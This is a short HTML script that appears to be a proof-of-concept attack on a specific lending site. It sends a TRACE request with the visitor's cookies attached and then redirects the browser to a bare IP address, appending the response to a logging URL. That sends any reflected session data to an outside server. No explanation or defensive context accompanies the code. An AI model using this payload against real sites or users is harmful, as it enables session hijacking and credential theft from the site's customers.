<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  var url = 'https://loan.crystal.ge/';
  req.withCredentials = true; // send cookie header
  req.open('TRACE', url, false);
  req.send();
  
  function reqListener() {
	location='//157.230.117.42/log?key='+this.responseText;
  };
</script>
